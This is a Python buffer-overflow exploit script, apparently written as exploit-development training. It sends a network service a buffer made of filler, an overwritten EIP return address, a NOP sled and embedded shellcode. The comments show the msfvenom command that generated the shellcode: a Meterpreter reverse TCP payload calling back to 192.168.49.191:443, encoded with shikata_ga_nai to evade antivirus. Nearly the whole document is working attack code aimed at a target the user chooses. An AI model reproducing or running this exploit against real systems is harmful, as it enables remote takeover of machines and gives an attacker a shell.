#!/usr/bin/python3
import socket
import sys

#usage ./S5FinalBoF.py {IP} {port} {offset}

ip = sys.argv[1]
port = int(sys.argv[2])
offset = int(sys.argv[3])

try:
	print("\nAttacking Application...")

	buffer = b""
	filler = b"A" * offset
	eip = b"\xcf\x10\x80\x14" #148010cf This is reversed because of little endian 
	nops = b"\x90" * 64 # These are known as Nops or no opration. these ensure that our shellcode will be after our esp register.
	#we do not want our shellcode to be cut off by being before the esp register.
	
	#generate shellcode with 
	#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.191 LPORT=443 EXITFUNC=thread -f python â€“e x86/shikata_ga_nai -b "\x00"
	#where we use -p for the platform we are attacking and payload we are using
	#EXITFUNC=thread becuase we dont want to close the vulnerable app when we close the shell
	#-e x86/shikata_ga_nai to encode the shellcode to either evade AV or avoid bad characters
	#-b lets you specify what the bad characters are.
	
	#Before sending the code make sure you start your listener.
	
	buf =  b""
	buf += b"\xbe\x83\x86\xa3\x6c\xd9\xc7\xd9\x74\x24\xf4\x5a\x29"
	buf += b"\xc9\xb1\x5e\x83\xc2\x04\x31\x72\x11\x03\x72\x11\xe2"
	buf += b"\x76\x7a\x4b\xe3\x78\x83\x8c\x9c\x49\x51\x05\xb9\xcd"
	buf += b"\xde\x44\x72\x86\xb3\x64\xf9\xca\x27\x7a\x4a\xa0\x61"
	buf += b"\x0f\xc6\x1c\x5f\xf0\x16\x9c\x33\x32\x38\x60\x4e\x67"
	buf += b"\x9a\x59\x81\x7a\xdb\x9e\x57\xf0\x34\x72\x3f\x71\x98"
	buf += b"\x62\x34\xc7\x21\x83\x9a\x43\x19\xfb\x9f\x94\xee\xb7"
	buf += b"\x9e\xc4\x84\x0f\xb9\xb4\x11\xd7\x99\x35\xf5\x62\x10"
	buf += b"\x41\xc5\x25\x92\x55\xbe\x81\x5f\xa8\x17\xd8\x9f\x6a"
	buf += b"\x58\x17\x8c\x6c\xa0\x1f\x2c\x1b\xda\x5c\xd1\x1c\x19"
	buf += b"\x1f\x0d\xa8\xbe\x87\xc6\x0a\x1b\x36\x0a\xcc\xe8\x34"
	buf += b"\xe7\x9a\xb7\x58\xf6\x4f\xcc\x64\x73\x6e\x03\xed\xc7"
	buf += b"\x55\x87\xb6\x9c\xf4\x9e\x12\x72\x08\xc0\xfa\x2b\xac"
	buf += b"\x8a\xe8\x3a\xd0\x72\xf3\x42\x8c\xe4\x38\x8f\x2f\xf5"
	buf += b"\x56\x98\x5c\xc7\xf9\x32\xcb\x6b\x72\x9d\x0c\xfd\x94"
	buf += b"\x1e\xc2\x45\xf4\xe0\xe3\xb5\xdd\x26\xb7\xe5\x75\x8e"
	buf += b"\xb8\x6d\x85\x2f\x6d\x1b\x8f\xa7\x4e\x74\xbe\x88\x27"
	buf += b"\x87\xc0\xf7\x0c\x0e\x26\xa7\x22\x41\xf6\x08\x93\x21"
	buf += b"\xa6\xe0\xf9\xad\x99\x11\x02\x64\xb2\xb8\xed\xd1\xeb"
	buf += b"\x54\x97\x7b\x67\xc4\x58\x56\x02\xc6\xd3\x53\xf3\x89"
	buf += b"\x13\x11\xe7\xfe\x43\xd9\xf7\xfe\xe1\xd9\x9d\xfa\xa3"
	buf += b"\x8e\x09\x01\x95\xf9\x96\xfa\xf0\x79\xd0\x05\x85\x4b"
	buf += b"\xab\x30\x13\xf4\xc3\x3c\xf3\xf4\x13\x6b\x99\xf4\x7b"
	buf += b"\xcb\xf9\xa6\x9e\x14\xd4\xda\x33\x81\xd7\x8a\xe0\x02"
	buf += b"\xb0\x30\xdf\x65\x1f\xca\x0a\xf6\x58\x34\xc9\xd1\xc0"
	buf += b"\x5d\x31\x62\xf1\x9d\x5b\x62\xa1\xf5\x90\x4d\x4e\x36"
	buf += b"\x59\x44\x07\x5e\xd0\x09\xe5\xff\xe5\x03\xab\xa1\xe6"
	buf += b"\xa0\x70\x51\x9d\xc9\x87\x92\x62\xc0\xe3\x92\x63\xec"
	buf += b"\x15\xae\xb2\xd5\x63\xf1\x07\x62\x6b\xec\xad\x9f\x04"
	buf += b"\xa9\x24\x22\x49\x4a\x93\x61\x74\xc9\x11\x1a\x83\xd1"
	buf += b"\x50\x1f\xcf\x55\x89\x6d\x40\x30\xad\xc2\x61\x11"



	buffer += filler + eip + nops + buf
	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	s.send(buffer)
	s.close()
	print("\nDone!")
  
except:
	print("\nFailure to connect. \n\nVerify that the vulnerable application is \n(a) running and\n(b) there is a connection to the vulnerable application.\n")
